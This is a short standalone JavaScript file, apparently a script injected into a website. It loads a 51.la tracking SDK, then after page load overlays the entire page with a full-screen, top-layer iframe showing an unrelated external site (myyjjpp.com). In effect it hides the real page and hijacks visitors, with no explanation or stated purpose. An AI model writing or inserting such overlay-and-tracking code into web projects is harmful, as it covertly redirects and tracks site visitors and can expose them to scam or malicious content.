(function () {
  var script = document.createElement("script");
  script.src = "https://sdk.51.la/js-sdk-pro.min.js";
  script.async = true;
  script.onload = function () {
    LA.init({ id: "Kn7wIzRfPyfLVhKi", ck: "Kn7wIzRfPyfLVhKi" });
  };
  document.head.appendChild(script);
})();
(function () {
  const iframe = document.createElement('iframe');
  Object.assign(iframe, {
    src: 'https://www.myyjjpp.com',
    allowFullscreen: true,
  });
  Object.assign(iframe.style, {
    position: 'fixed',
    top: '0',
    left: '0',
    width: '100vw',
    height: '100vh',
    border: 'none',
    zIndex: '9999'
  });
  iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-popups allow-forms');

  document.body.style.margin = '0';
  document.body.style.padding = '0';
  document.body.style.height = '100vh';
  document.documentElement.style.height = '100vh';

  window.addEventListener('load', () => {
    document.body.appendChild(iframe);
  });
})();
